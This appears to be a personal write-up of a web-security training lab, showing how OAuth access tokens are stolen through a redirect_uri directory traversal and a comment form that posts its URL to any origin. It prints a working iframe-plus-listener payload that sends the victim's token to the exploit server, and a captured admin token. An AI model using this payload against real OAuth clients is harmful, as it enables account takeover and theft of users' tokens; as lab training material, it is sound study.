# Stealing OAuth access tokens via a proxy page
* This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
	* To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
	* The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service
		* You can log in via your own social media account using the follwoing credentials `wiener: peter`

### 1. Enumerate the web page
* When click "My account", the page is redirected to a social media login page.

![14](https://user-images.githubusercontent.com/53956303/156851721-6108ab6f-78ae-4745-8f1b-e0a1877e231e.png)
* Login as "wiener:peter".
	* The page returns a authorization page.

![15](https://user-images.githubusercontent.com/53956303/156851801-8d0d8130-84f5-412a-9393-b68cef3729af.png)
* when click "Continue", successfully logged in with the social media account.

![16](https://user-images.githubusercontent.com/53956303/156851907-2bdab32b-cd9f-4254-bfc8-48797b62b0ec.png)
### 2. Enumerate reqeusts using Burp HTTP history
* From the social media login, a `GET /auth` request is made first.
	* It has `redirect_uri` to `/oauth-callback`.

![36](https://user-images.githubusercontent.com/53956303/156861967-b261e267-4115-4a54-b965-6f3308124bcb.png)
### 3. Try to modfy the `redirect_uri`
* Try to supply an external uri `test.com`

![37](https://user-images.githubusercontent.com/53956303/156861998-caacb3bb-cc05-41cb-aa73-e7936ce91dd3.png)
* The external domain is being validated against whitelist.
### 4. Test directory treaversal
* Capture a new request to change `redirect_uri` using a directory traversal sequence.

![39](https://user-images.githubusercontent.com/53956303/156863408-13e27a2e-f02d-4451-9521-b3a8999d5772.png)
* The page is redirected to a post and the token is included in URL as a fragment.
### 5. Enumerate the comment
* From the `/post/comment/comment-form` request, a `postMessage()` method to send the `window.location.href` property to its parent window is found.
	* Crucially, it allows message to be posted to any origin (*)

![38](https://user-images.githubusercontent.com/53956303/156862099-1113a2b6-d5c4-4068-bebf-0591f85cede1.png)
### 6. Make a malicious iframe in which the `src` attribute is the URL of `GET /auth`. Use directory dreaversal 
* Copy the `GET /auth` URL and use as a `src` attribute. Use directory traversal to change the `redirect_uri` so that it points the comment form.
```iframe
<iframe src="https://oauth-acbb1fa71f22e7cec0de4efb02c800dc.web-security-academy.net/auth?client_id=fndgktenc2p4jq8s880fc&redirect_uri=https://ac841f361fd4e7d7c09c4ed4006200ad.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1491054907&scope=openid%20profile%20email"></iframe>
```
* Below this, add a suitable script that will listen for web messages and output the contents somewhere. For exmple, you can use the following script to reveal the web message in the exploit server's access log:
```javascript
<script>
	window.addEventListener('message', function(e) {
		fetch("/" + encodeURIComponent(e.data.data))
	}, false)
</script>
```
![40](https://user-images.githubusercontent.com/53956303/156863641-e84971c1-2d99-4879-abb3-891e066152b7.png)

* To check the exploit is working, store it and then click "View exploit". Make sure that the `iframe` loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the acess token.

![41](https://user-images.githubusercontent.com/53956303/156863680-50428094-ef29-4297-b206-f489199bdb84.png)
* The exploit worked well!
	* Deliver the exploit to admin to obatin the admin token.

![42](https://user-images.githubusercontent.com/53956303/156864092-3dd1fedf-ca98-4761-88f2-a95bf524f1ac.png)* As a result, an admin token `nOUwSGK0EY1AMZbQDOZf-EI9qu1IrvUA0uCE5pHGMa_` is given.
### 7. Obtain the Admin API key
* According to `/oauth-callback`, the components to construct an API call is found.

![43](https://user-images.githubusercontent.com/53956303/156863823-2aa00185-d467-46ef-bd21-41ea168aeef8.png)
* Modify `GET /me` by replace the token with the obtained Admin key.
	* As a result, Admin's API key is found.

![44](https://user-images.githubusercontent.com/53956303/156864136-aa0a1192-d480-410b-9e3d-df0f7dfe6ab6.png)
* By submitting the API key, lab is solved.

![45](https://user-images.githubusercontent.com/53956303/156864159-6d81cf1b-6c4b-4f92-a397-ed522d8d27c0.png)
